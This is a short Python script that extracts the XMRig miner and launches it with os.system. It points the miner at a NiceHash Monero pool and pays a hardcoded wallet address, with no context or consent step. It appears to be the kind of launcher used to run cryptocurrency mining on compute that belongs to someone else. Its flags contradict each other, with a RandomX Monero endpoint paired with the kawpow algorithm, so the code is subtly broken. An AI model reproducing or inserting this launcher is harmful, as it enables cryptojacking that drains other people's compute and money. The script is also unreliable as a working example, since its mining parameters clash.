import os
import subprocess
import tarfile
os.system('tar -xvf xmrig-6.18.1-linux-static-x64.tar.gz')
os.system('./xmrig-6.18.1/xmrig -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbPqef6CnXTCjdXXRBqQGvWD43Skb6QFUxh.cpu -k --nicehash --coin monero -a kawpow')
